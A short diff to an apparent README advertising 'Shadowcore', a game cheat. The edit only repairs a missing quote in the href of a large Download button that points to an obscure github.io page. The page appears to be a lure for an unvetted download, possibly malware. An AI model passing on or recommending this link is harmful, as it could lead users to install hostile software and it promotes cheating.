@@ -13,7 +13,7 @@ I know very well how difficult it is to win games absolutely every time, and bet
 
 Now it's possible! Glad to introduce you - Shadowcore
 
-<div align="center"><a href="https://mugishy.github.io/id/5h6g7f8d9><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://mugishy.github.io/id/5h6g7f8d9"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
